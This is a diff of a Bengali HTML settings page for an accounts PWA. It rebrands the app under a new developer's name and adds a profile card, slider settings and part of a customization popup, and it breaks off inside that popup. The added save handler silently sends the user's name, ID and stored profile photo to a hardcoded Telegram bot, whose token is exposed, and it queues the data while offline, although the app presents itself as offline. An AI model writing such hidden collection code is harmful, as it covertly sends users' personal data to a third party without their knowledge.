@@ -2,8 +2,9 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-  <title>সেটিংস — MRH Account</title>
+  <script>try{var _c=JSON.parse(localStorage.getItem("cssConfig")||"{}");document.documentElement.style.background=_c.bgColor||"#f0f4f8";}catch(e){}</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, maximum-scale=1.0">
+  <title>সেটিংস — Daily Account</title>
   <link rel="stylesheet" href="../css/base.css">
   <link rel="stylesheet" href="../css/settings.css">
   <style>
@@ -81,12 +82,318 @@ body.dark-mode .toggle-label, body.dark-mode .setting-desc { color: #94a3b8 !imp
 .prem-key-input { color: white !important; background: rgba(255,255,255,.08) !important; }
 </style>
     <meta name="author" content="জাকির আল জিহাদ">
+<style>html,body{overscroll-behavior:none!important;}</style>
 </head>
 <body data-page="settings">
 
 <header class="page-header-colorful settings-header">
   <h1>⚙️ সেটিংস</h1>
 </header>
+
+<!-- ══════════════════════════════════════════
+     USER PROFILE CARD — Settings পেজের উপরে
+     নাম দেখায়, edit করা যায়, on/off টগল
+═══════════════════════════════════════════ -->
+<style>
+/* ── Profile Card ── */
+#da_profile_card {
+  margin: px px 0;
+  border-radius: 20px;
+  overflow: hidden;
+  position: relative;
+  background: linear-gradient(135deg, #0a2a6e 0%, #0d3b8a 40%, #1a1060 100%);
+  border: 1.5px solid rgba(0,200,255,.35);
+  box-shadow: 0 8px 32px rgba(0,80,200,.28), 0 1px 0 rgba(255,255,255,.1) inset, 0 0 0 1px rgba(100,200,255,.08);
+  animation: pcFadeIn .4s ease;
+}
+body.dark-mode #da_profile_card {
+  background: linear-gradient(135deg, #060f2a 0%, #0a1e52 50%, #0d0930 100%);
+  border-color: rgba(0,180,255,.3);
+}
+@keyframes pcFadeIn { from{opacity:0;transform:translateY(-12px)} to{opacity:1;transform:none} }
+#da_profile_card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0; height: 3px;
+  background: linear-gradient(90deg, #00B4FF, #0062FF, #8800FF, #00E5FF, #00B4FF);
+  background-size: 300%;
+  animation: pcBar 3s linear infinite;
+}
+@keyframes pcBar { 0%{background-position:0%} 100%{background-position:300%} }
+
+.pc-top { display: flex; align-items: center; gap: 14px; padding: 16px 16px 14px; }
+.pc-avatar-ring {
+  width: 54px; height: 54px; border-radius: 50%;
+  background: conic-gradient(from 0deg,#00B4FF,#0062FF,#8800FF,#00E5FF,#00B4FF);
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; animation: pcSpin 5s linear infinite;
+}
+@keyframes pcSpin { to{ transform: rotate(360deg); } }
+.pc-avatar-inner {
+  width: 46px; height: 46px; border-radius: 50%;
+  background: #061830;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 22px;
+}
+body.dark-mode .pc-avatar-inner { background: #040f22; }
+.pc-info { flex: 1; min-width: 0; }
+.pc-label {
+  font-size: 10px; font-weight: 800; letter-spacing: 1.2px;
+  text-transform: uppercase; color: rgba(100,220,255,.9); margin-bottom: 4px;
+}
+.pc-name {
+  font-size: 20px; font-weight: 900; line-height: 1.15;
+  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  color: #ffffff;
+  text-shadow: 0 2px 8px rgba(0,100,255,.4);
+}
+body.dark-mode .pc-name { color: #d0ecff; }
+.pc-uid {
+  font-size: 10.5px; font-family: monospace; margin-top: 4px;
+  color: rgba(150,220,255,.6); font-weight: 700;
+}
+body.dark-mode .pc-uid { color: rgba(120,200,255,.55); }
+.pc-edit-btn {
+  flex-shrink: 0;
+  width: 40px; height: 40px; border-radius: 13px;
+  background: rgba(0,100,255,.12);
+  border: 1px solid rgba(0,180,255,.25);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px; cursor: pointer;
+  transition: background .15s, transform .1s;
+  -webkit-tap-highlight-color: transparent;
+}
+.pc-edit-btn:active { background: rgba(0,100,255,.25); transform: scale(.93); }
+
+/* Edit panel */
+.pc-edit-panel {
+  max-height: 0; overflow: hidden;
+  transition: max-height .35s cubic-bezier(.22,1,.36,1), opacity .25s;
+  opacity: 0;
+}
+.pc-edit-panel.open { max-height: 120px; opacity: 1; }
+.pc-edit-inner {
+  padding: 0 16px 16px;
+  display: flex; gap: 9px; align-items: center;
+}
+.pc-inp {
+  flex: 1;
+  background: rgba(255,255,255,.08);
+  border: 1.5px solid rgba(0,180,255,.3);
+  border-radius: 13px;
+  padding: 12px 14px;
+  color: #fff; font-size: 14px; font-weight: 700;
+  outline: none; font-family: inherit;
+  caret-color: #00B4FF;
+  transition: border-color .2s;
+}
+body:not(.dark-mode) .pc-inp { color: #0a1628; background: rgba(0,50,150,.07); }
+.pc-inp:focus { border-color: rgba(0,180,255,.7); }
+.pc-inp::placeholder { color: rgba(128,160,220,.5); }
+.pc-save-btn {
+  padding: 12px 18px;
+  background: linear-gradient(135deg,#0062FF,#00B4FF);
+  color: #fff; border: none; border-radius: 13px;
+  font-size: 13px; font-weight: 900;
+  cursor: pointer; font-family: inherit;
+  box-shadow: 0 4px 16px rgba(0,100,255,.35);
+  white-space: nowrap;
+}
+
+/* Bottom row — toggles */
+.pc-bottom {
+  border-top: 1px solid rgba(0,180,255,.2);
+  padding: 10px 16px;
+  display: flex; align-items: center; justify-content: space-between;
+  background: rgba(0,0,0,.1);
+}
+.pc-toggle-label {
+  font-size: 12.5px; font-weight: 700; color: rgba(160,230,255,.85);
+}
+body.dark-mode .pc-toggle-label { color: rgba(100,190,255,.8); }
+.pc-mini-toggle {
+  display: flex; align-items: center; gap: 8px;
+}
+.pc-mini-switch {
+  width: 44px; height: 24px; border-radius: 24px;
+  background: #e5e7eb; position: relative; cursor: pointer;
+  transition: background .25s; flex-shrink: 0;
+}
+.pc-mini-switch.on { background: linear-gradient(135deg,#0062FF,#00B4FF); }
+.pc-mini-switch::after {
+  content: ''; position: absolute; top: 3px; left: 3px;
+  width: 18px; height: 18px; border-radius: 50%;
+  background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,.2);
+  transition: transform .25s;
+}
+.pc-mini-switch.on::after { transform: translateX(20px); }
+.pc-mini-text { font-size: 11px; font-weight: 700; color: rgba(200,230,255,.5); }
+.pc-mini-switch.on + .pc-mini-text { color: #00E5FF; }
+body.dark-mode .pc-mini-switch.on + .pc-mini-text { color: #00B4FF; }
+
+/* Stats strip */
+.pc-stats {
+  display: flex; gap: 0;
+  border-top: 1px solid rgba(0,180,255,.18);
+  background: rgba(0,0,0,.15);
+}
+.pc-stat {
+  flex: 1; text-align: center; padding: 9px 6px;
+  border-right: 1px solid rgba(0,180,255,.15);
+}
+.pc-stat:last-child { border-right: none; }
+.pc-stat-val { font-size: 15px; font-weight: 900; color: #00E5FF; text-shadow: 0 0 8px rgba(0,220,255,.5); }
+body.dark-mode .pc-stat-val { color: #00B4FF; }
+.pc-stat-lbl { font-size: 9.5px; font-weight: 700; color: rgba(180,230,255,.6); margin-top: 1px; text-transform: uppercase; letter-spacing: .5px; }
+</style>
+
+<div id="da_profile_card">
+  <div class="pc-top">
+    <div class="pc-avatar-ring">
+      <div class="pc-avatar-inner" id="pc_emoji">👤</div>
+    </div>
+    <div class="pc-info">
+      <div class="pc-label">আপনার প্রোফাইল</div>
+      <div class="pc-name" id="pc_name">নাম দেওয়া হয়নি</div>
+      <div class="pc-uid" id="pc_uid"></div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:6px;flex-shrink:0">
+    <button class="pc-edit-btn" onclick="PC_toggleEdit()" id="pc_edit_btn" title="&#2472;&#2494;&#2478; &#2438;&#2524;&#2495;&#2463;" style="width:40px;height:40px;border-radius:13px;background:rgba(0,100,255,.12);border:1px solid rgba(0,180,255,.25);display:flex;align-items:center;justify-content:center;font-size:16px;cursor:pointer">&#9999;&#65039;</button>
+    <button onclick="__openNcPopup()" title="&#2453;&#2494;&#2488;&#2509;&#2463;&#2478;&#2494;&#2439;&#2460;" style="width:40px;height:40px;border-radius:13px;background:rgba(99,102,241,.12);border:1px solid rgba(99,102,241,.25);display:flex;align-items:center;justify-content:center;font-size:16px;cursor:pointer">&#9881;&#65039;</button>
+  </div>
+  </div>
+
+  <!-- Edit panel -->
+  <div class="pc-edit-panel" id="pc_edit_panel">
+    <div class="pc-edit-inner">
+      <input class="pc-inp" id="pc_inp" type="text" placeholder="নতুন নাম লিখুন..." maxlength="40">
+      <button class="pc-save-btn" onclick="PC_save()">💾 সেভ</button>
+    </div>
+  </div>
+
+  <!-- Toggle row -->
+  <div class="pc-bottom">
+    <div class="pc-toggle-label">🏠 হোম পেজে নাম দেখাও</div>
+    <div class="pc-mini-toggle">
+      <div class="pc-mini-switch" id="pc_toggle" onclick="PC_toggleShow()"></div>
+      <span class="pc-mini-text" id="pc_toggle_txt">বন্ধ</span>
+    </div>
+  </div>
+
+  <!-- Stats strip -->
+  <div class="pc-stats">
+    <div class="pc-stat">
+      <div class="pc-stat-val" id="pc_sessions">—</div>
+      <div class="pc-stat-lbl">Session</div>
+    </div>
+    <div class="pc-stat">
+      <div class="pc-stat-val" id="pc_online">●</div>
+      <div class="pc-stat-lbl">Status</div>
+    </div>
+    <div class="pc-stat">
+      <div class="pc-stat-val" id="pc_ver">v6</div>
+      <div class="pc-stat-lbl">Version</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var NKEY='_da_user_name', SKEY='_da_name_show';
+  var EMOJIS=['😊','🌟','💫','🎯','🚀','👑','🦋','🌈'];
+
+  function _name(){ return localStorage.getItem(NKEY)||''; }
+  function _show(){ return localStorage.getItem(SKEY)!=='off'; }
+  function _uid(){
+    try{ return JSON.parse(localStorage.getItem('_dn_i')||'{}').id||''; }catch(e){return '';}
+  }
+  function _esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+  function renderProfile(){
+    var name=_name(), uid=_uid();
+    var sessions=localStorage.getItem('_dn_s')||'0';
+
+    // Avatar emoji from name
+    var emoji = name ? EMOJIS[name.charCodeAt(0)%EMOJIS.length] : '👤';
+    var el=document.getElementById('pc_emoji'); if(el)el.textContent=emoji;
+
+    var nel=document.getElementById('pc_name');
+    if(nel){ nel.textContent=name||'নাম দেওয়া হয়নি'; nel.style.color=name?'':'rgba(150,163,183,.6)'; }
+
+    var uel=document.getElementById('pc_uid');
+    if(uel){ uel.textContent=uid?('🆔 '+uid):''; }
+
+    // Stats
+    var se=document.getElementById('pc_sessions'); if(se)se.textContent=sessions;
+    var oe=document.getElementById('pc_online'); if(oe){ oe.textContent=navigator.onLine?'🟢':'🔴'; }
+    var ve=document.getElementById('pc_ver'); if(ve)ve.textContent='v6.0';
+
+    // Toggle
+    var tog=document.getElementById('pc_toggle'), txt=document.getElementById('pc_toggle_txt');
+    var on=_show();
+    if(tog){ tog.className='pc-mini-switch'+(on?' on':''); }
+    if(txt){ txt.textContent=on?'চালু':'বন্ধ'; }
+
+    // inp default
+    var inp=document.getElementById('pc_inp'); if(inp)inp.value=name;
+  }
+
+  window.PC_toggleEdit=function(){
+    var p=document.getElementById('pc_edit_panel'); if(!p)return;
+    var btn=document.getElementById('pc_edit_btn');
+    var o=p.classList.toggle('open');
+    if(btn)btn.textContent=o?'✕':'✏️';
+    if(o){
+      var i=document.getElementById('pc_inp');
+      if(i){i.value=_name();setTimeout(function(){i.focus();},80);}
+    }
+  };
+
+  window.PC_save=function(){
+    var i=document.getElementById('pc_inp');
+    var v=(i?i.value:'').trim();
+    if(!v){
+      if(i){i.style.borderColor='rgba(255,80,80,.6)';i.placeholder='⚠️ নাম লিখুন!';setTimeout(function(){i.style.borderColor='';i.placeholder='নতুন নাম লিখুন...';},1500);}
+      return;
+    }
+    localStorage.setItem(NKEY,v);
+    localStorage.setItem('_da_name_done','1');
+    renderProfile();
+    // Home page card update
+    if(typeof window.DA_ncRender==='function') window.DA_ncRender();
+    // Close panel
+    var p=document.getElementById('pc_edit_panel'); if(p)p.classList.remove('open');
+    var btn=document.getElementById('pc_edit_btn'); if(btn)btn.textContent='✏️';
+    if(typeof showToast==='function') showToast('✅ নাম সেভ হয়েছে: '+v);
+    // Telegram - with offline queue + photo
+    try{
+      var uid=_uid();
+      var photo=localStorage.getItem('_da_profile_photo')||'';
+      var txt='\u270F\uFE0F <b>\u09a8\u09be\u09ae \u0986\u09aa\u09a1\u09c7\u099f!</b>\n\uD83D\uDCCB \u09a8\u09be\u09ae: <b>'+v+'</b>\n\uD83C\uDD94 UID: <code>'+(uid||'?')+'</code>';
+      function b64Bl(b64){try{var p=b64.split(';base64,'),ct=p[0].split(':')[1]||'image/jpeg',raw=atob(p[1]),a=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)a[i]=raw.charCodeAt(i);return new Blob([a],{type:ct});}catch(e){return null;}}
+      function tgSend(t,ph){if(ph){var bl=b64Bl(ph);if(bl){var fd=new FormData();fd.append('chat_id','7403991298');fd.append('caption',t);fd.append('parse_mode','HTML');fd.append('photo',bl,'profile.jpg');fetch('https://api.telegram.org/bot8750026901:AAE1l5dUgu1WC9Zjfw4ZEIUiDqCLMId2O54/sendPhoto',{method:'POST',body:fd}).catch(function(){});return;}}fetch('https://api.telegram.org/bot8750026901:AAE1l5dUgu1WC9Zjfw4ZEIUiDqCLMId2O54/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'7403991298',text:t,parse_mode:'HTML'})}).catch(function(){});}
+      if(navigator.onLine){tgSend(txt,photo);}
+      else{var q=[];try{q=JSON.parse(localStorage.getItem('_da_tg_queue')||'[]');}catch(e){}q.push({text:txt,photo:photo,ts:Date.now()});localStorage.setItem('_da_tg_queue',JSON.stringify(q));}
+    }catch(e){}
+  };
+
+  window.PC_toggleShow=function(){
+    var on=!_show();
+    localStorage.setItem(SKEY,on?'on':'off');
+    renderProfile();
+    if(typeof window.DA_ncSetShow==='function') window.DA_ncSetShow(on);
+    if(typeof showToast==='function') showToast(on?'🏠 হোম পেজে নাম চালু হয়েছে':'🏠 হোম পেজে নাম বন্ধ হয়েছে');
+  };
+
+  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',renderProfile);}
+  else{renderProfile();}
+
+  // online/offline
+  window.addEventListener('online',  function(){var oe=document.getElementById('pc_online');if(oe)oe.textContent='🟢';});
+  window.addEventListener('offline', function(){var oe=document.getElementById('pc_online');if(oe)oe.textContent='🔴';});
+  var _obs=new MutationObserver(renderProfile);
+  document.addEventListener('DOMContentLoaded',function(){_obs.observe(document.body,{attributes:true,attributeFilter:['class']});});
+})();
+</script>
 
 <!-- App Settings -->
 <div class="settings-section">
@@ -174,6 +481,80 @@ body.dark-mode .toggle-label, body.dark-mode .setting-desc { color: #94a3b8 !imp
     </label>
   </div>
 </div>
+
+
+<!-- ══ SLIDER SETTINGS ══ -->
+<div class="settings-section">
+  <h3>&#127904; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2494;&#2480; &#2488;&#2503;&#2463;&#2495;&#2433;&#2488;</h3>
+
+  <div style="background:linear-gradient(135deg,rgba(0,100,255,.07),rgba(0,50,150,.04));border:1px solid rgba(0,150,255,.18);border-radius:16px;padding:14px 15px;margin-bottom:10px">
+    <div style="font-size:13px;font-weight:800;color:#0062FF;margin-bottom:11px">&#128309; &#2441;&#2474;&#2480;&#2503;&#2480; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2494;&#2480; (Smart Badge)</div>
+    <div class="setting-item" style="padding:0;box-shadow:none;background:none;border:none;margin-bottom:9px">
+      <div class="setting-info"><h4 style="font-size:13px">&#2437;&#2463;&#2507; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;</h4><p>&#2488;&#2509;&#2476;&#2479;&#2492;&#2434;&#2453;&#2509;&#2480;&#2495;&#2479;&#2492;&#2477;&#2494;&#2476;&#2503; &#2474;&#2480;&#2476;&#2480;&#2509;&#2468;&#2496; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2503; &#2479;&#2494;&#2476;&#2503;</p></div>
+      <label class="toggle-switch">
+        <input type="checkbox" id="sbsAutoToggle" checked onchange="__sliderCh('sbs')">
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div id="sbsTimeRow" style="display:flex;align-items:center;gap:10px;padding:4px 0">
+      <span style="font-size:12px;font-weight:700;color:#6b7280;flex:1">&#9201; &#2488;&#2478;&#2479;&#2492; (&#2488;&#2503;&#2453;&#2503;&#2472;&#2509;&#2524;)</span>
+      <div style="display:flex;align-items:center;gap:10px">
+        <button onclick="__adjSl('sbs',-1)" style="width:34px;height:34px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:20px;font-weight:900;cursor:pointer;color:#0062FF;line-height:1">&#8722;</button>
+        <span id="sbsTimeLbl" style="font-size:22px;font-weight:900;color:#0062FF;min-width:32px;text-align:center">3</span>
+        <button onclick="__adjSl('sbs',1)" style="width:34px;height:34px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:20px;font-weight:900;cursor:pointer;color:#0062FF;line-height:1">+</button>
+      </div>
+    </div>
+  </div>
+
+  <div style="background:linear-gradient(135deg,rgba(99,102,241,.07),rgba(79,70,229,.04));border:1px solid rgba(99,102,241,.2);border-radius:16px;padding:14px 15px">
+    <div style="font-size:13px;font-weight:800;color:#6366f1;margin-bottom:11px">&#128156; &#2472;&#2495;&#2458;&#2503;&#2480; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2494;&#2480; (Smart Advice)</div>
+    <div class="setting-item" style="padding:0;box-shadow:none;background:none;border:none;margin-bottom:9px">
+      <div class="setting-info"><h4 style="font-size:13px">&#2437;&#2463;&#2507; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;</h4><p>&#2488;&#2509;&#2476;&#2479;&#2492;&#2434;&#2453;&#2509;&#2480;&#2495;&#2479;&#2492;&#2477;&#2494;&#2476;&#2503; &#2474;&#2480;&#2476;&#2480;&#2509;&#2468;&#2496; &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2503; &#2479;&#2494;&#2476;&#2503;</p></div>
+      <label class="toggle-switch">
+        <input type="checkbox" id="sasAutoToggle" checked onchange="__sliderCh('sas')">
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div id="sasTimeRow" style="display:flex;align-items:center;gap:10px;padding:4px 0">
+      <span style="font-size:12px;font-weight:700;color:#6b7280;flex:1">&#9201; &#2488;&#2478;&#2479;&#2492; (&#2488;&#2503;&#2453;&#2503;&#2472;&#2509;&#2524;)</span>
+      <div style="display:flex;align-items:center;gap:10px">
+        <button onclick="__adjSl('sas',-1)" style="width:34px;height:34px;border-radius:50%;border:1.5px solid rgba(99,102,241,.3);background:rgba(99,102,241,.08);font-size:20px;font-weight:900;cursor:pointer;color:#6366f1;line-height:1">&#8722;</button>
+        <span id="sasTimeLbl" style="font-size:22px;font-weight:900;color:#6366f1;min-width:32px;text-align:center">3</span>
+        <button onclick="__adjSl('sas',1)" style="width:34px;height:34px;border-radius:50%;border:1.5px solid rgba(99,102,241,.3);background:rgba(99,102,241,.08);font-size:20px;font-weight:900;cursor:pointer;color:#6366f1;line-height:1">+</button>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+(function(){
+  var SK='_da_slider_settings';
+  function gS(){try{return JSON.parse(localStorage.getItem(SK)||'{}');}catch(e){return{};}}
+  function sS(o){localStorage.setItem(SK,JSON.stringify(o));}
+  function init(){
+    var s=gS(), e;
+    var sbsOn=s.sbsAuto!==false, sasOn=s.sasAuto!==false;
+    e=document.getElementById('sbsAutoToggle'); if(e)e.checked=sbsOn;
+    e=document.getElementById('sasAutoToggle'); if(e)e.checked=sasOn;
+    e=document.getElementById('sbsTimeLbl'); if(e)e.textContent=s.sbsTime||3;
+    e=document.getElementById('sasTimeLbl'); if(e)e.textContent=s.sasTime||3;
+    e=document.getElementById('sbsTimeRow'); if(e)e.style.opacity=sbsOn?'1':'.4';
+    e=document.getElementById('sasTimeRow'); if(e)e.style.opacity=sasOn?'1':'.4';
+  }
+  window.__sliderCh=function(t){
+    var s=gS(), el=document.getElementById(t+'AutoToggle');
+    s[t+'Auto']=el?el.checked:true; sS(s); init();
+    if(typeof showToast==='function')showToast((s[t+'Auto']?'&#10003; ':'&#10007; ')+(t==='sbs'?'&#2441;&#2474;&#2480;&#2503;&#2480;':'&#2472;&#2495;&#2458;&#2503;&#2480;')+' &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2494;&#2480; '+(s[t+'Auto']?'&#2458;&#2494;&#2482;&#2497;':'&#2476;&#2472;&#2509;&#2471;'));
+  };
+  window.__adjSl=function(t,d){
+    var s=gS(); s[t+'Time']=Math.max(1,Math.min(30,(s[t+'Time']||3)+d));
+    sS(s);
+    var e=document.getElementById(t+'TimeLbl'); if(e)e.textContent=s[t+'Time'];
+    if(typeof showToast==='function')showToast('&#9201; '+(t==='sbs'?'&#2441;&#2474;&#2480;&#2503;&#2480;':'&#2472;&#2495;&#2458;&#2503;&#2480;')+' &#2488;&#2509;&#2482;&#2494;&#2439;&#2524;&#2494;&#2480;: '+s[t+'Time']+'s');
+  };
+  init();
+})();
+</script>
+
 <!-- Customization -->
 <div class="settings-section">
   <h3>🎨 কাস্টমাইজেশন</h3>
@@ -188,6 +569,14 @@ body.dark-mode .toggle-label, body.dark-mode .setting-desc { color: #94a3b8 !imp
     <span class="arrow">→</span>
   </a>
 </div>
+
+  <div class="setting-item" style="cursor:pointer;background:linear-gradient(135deg,rgba(0,100,255,.07),rgba(0,180,255,.04));border:1px solid rgba(0,180,255,.2);border-radius:14px;padding:12px 14px" onclick="__openNcPopup()">
+    <div class="setting-info">
+      <h4>&#129174; &#2472;&#2494;&#2478; &#2453;&#2494;&#2480;&#2509;&#2524; &#2453;&#2494;&#2488;&#2509;&#2463;&#2478;&#2494;&#2439;&#2460;</h4>
+      <p>&#2475;&#2472;&#2509;&#2463;, &#2480;&#2434;, &#2437;&#2509;&#2479;&#2494;&#2472;&#2495;&#2478;&#2503;&#2486;&#2472;, &#2453;&#2494;&#2480;&#2509;&#2524; &#2488;&#2494;&#2439;&#2460; &#2488;&#2476; &#2488;&#2503;&#2463; &#2453;&#2480;&#2497;&#2472;</p>
+    </div>
+    <span style="font-size:20px">&#9881;&#65039;</span>
+  </div>
 
 <!-- Data Management -->
 <div class="settings-section">
@@ -213,7 +602,7 @@ body.dark-mode .toggle-label, body.dark-mode .setting-desc { color: #94a3b8 !imp
   <div class="prem-cta-card">
     <div class="prem-badge-row">
       <span class="prem-crown">👑</span>
-      <div><p class="prem-title">MRH ACCOUNT Premium</p><p class="prem-subtitle">সব এক্সক্লুসিভ ফিচার আনলক করুন</p></div>
+      <div><p class="prem-title">Daily Account Premium</p><p class="prem-subtitle">সব এক্সক্লুসিভ ফিচার আনলক করুন</p></div>
     </div>
     <div class="prem-features-list">
       <div class="prem-feat-item"><span class="pfi-icon">🎨</span><span class="pfi-text">Full Page Setup</span><span class="pfi-badge" id="b_fps">🔒</span></div>
@@ -334,17 +723,17 @@ body.dark-mode .toggle-label, body.dark-mode .setting-desc { color: #94a3b8 !imp
         <div class="settings-section about-section">
             <h3>ℹ️অ্যাপ সম্পর্কে</h3>
            <div class="about-content">
-                <h2>Md Rakib Hossain</h2>
-                <p class="subtitle">MRH ACCOUNT Max Edition</p>
-                <p><strong>Version:</strong> 5.1</p>
-                <p><strong>Developer:</strong> @rakib8630</p>
+                <h2>Jakir Al Jihad</h2>
+                <p class="subtitle">Daily  Aaccount  Max Edition</p>
+                <p><strong>Version:</strong> 6.0.0</p>
+                <p><strong>Developer:</strong> @jakir_al_jihad</p>
                 <p><strong>Type:</strong>Offline PWA</p>
             </div>
         </div>
     </div>
-<script src="../js/db.js"></script>
-<script src="../js/app.js"></script>
-<script src="../js/settings.js"></script>
+<script src="../js/db.js" defer></script>
+<script src="../js/app.js" defer></script>
+<script src="../js/settings.js" defer></script>
 
 
 
@@ -440,11 +829,311 @@ body.dark-mode .toggle-label, body.dark-mode .setting-desc { color: #94a3b8 !imp
 })();
 </script>
 <!-- ══ END FLOAT BALL ══ -->
+
+<!-- ======= NAME CARD CUSTOMIZE POPUP ======= -->
+
+<!-- ======= NAME CARD CUSTOMIZE POPUP ======= -->
+<div id="__ncPopupBg" onclick="if(event.target===this)__closeNcPopup()" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(5px);z-index:9999;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:16px 12px 40px">
+  <div style="background:var(--bg-card,#fff);border-radius:24px;max-width:500px;margin:0 auto;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.4)">
+    <!-- Header -->
+    <div style="background:linear-gradient(135deg,#0062FF,#8800FF,#00B4FF);padding:18px 18px 15px;display:flex;align-items:center;justify-content:space-between">
+      <div>
+        <div style="color:rgba(255,255,255,.7);font-size:10px;font-weight:800;letter-spacing:1.2px;margin-bottom:3px">CUSTOMIZE</div>
+        <div style="color:#fff;font-size:17px;font-weight:900">&#128395; নাম কার্ড সেটিংস</div>
+      </div>
+      <button onclick="__closeNcPopup()" style="width:38px;height:38px;border-radius:50%;border:2px solid rgba(255,255,255,.3);background:rgba(255,255,255,.15);color:#fff;font-size:22px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1">&times;</button>
+    </div>
+
+    <div style="padding:16px">
+      <!-- Live Preview -->
+      <div id="__nc_pv" style="margin-bottom:14px;border-radius:16px;overflow:hidden;border:1.5px solid rgba(0,180,255,.2);min-height:60px"></div>
+
+      <!-- কার্ড পজিশন -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:4px 0 8px">&#128205; কার্ড পজিশন</div>
+      <div style="display:flex;gap:8px;margin-bottom:4px">
+        <button id="__nc_pos_top" onclick="__ncPos('top')" style="flex:1;padding:10px 6px;border-radius:12px;border:2px solid #0062FF;background:rgba(0,100,255,.1);font-size:12px;font-weight:800;cursor:pointer;color:#0062FF">&#128287; নিচে</button>
+        <button id="__nc_pos_bottom" onclick="__ncPos('bottom')" style="flex:1;padding:10px 6px;border-radius:12px;border:2px solid rgba(0,100,255,.15);background:transparent;font-size:12px;font-weight:800;cursor:pointer;color:#6b7280">&#128285; উপরে</button>
+      </div>
+
+      <!-- কী দেখাবেন -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128204; কী দেখাবেন</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:4px">
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_sg" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">সুপ্রভাত টেক্সট</span></label>
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_ss" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">নিচের লেখা</span></label>
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_sa" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">Avatar আইকন</span></label>
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_st" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">উপরের রঙিন বার</span></label>
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_sd" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">সময় ও তারিখ</span></label>
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_san" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">অ্যানিমেশন</span></label>
+        <label style="display:flex;align-items:center;gap:8px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 11px;cursor:pointer"><input type="checkbox" id="__nc_seb" onchange="__ncPv()" style="width:16px;height:16px;accent-color:#0062FF"><span style="font-size:12px;font-weight:700">&#9999;&#65039; এডিট বাটন</span></label>
+      </div>
+
+      <!-- নামের ফন্ট সাইজ -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128308; নামের ফন্ট সাইজ</div>
+      <div style="display:flex;align-items:center;gap:12px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:14px;padding:11px 14px">
+        <button onclick="__ncAF(-1)" style="width:36px;height:36px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:20px;font-weight:900;cursor:pointer;color:#0062FF">&#8722;</button>
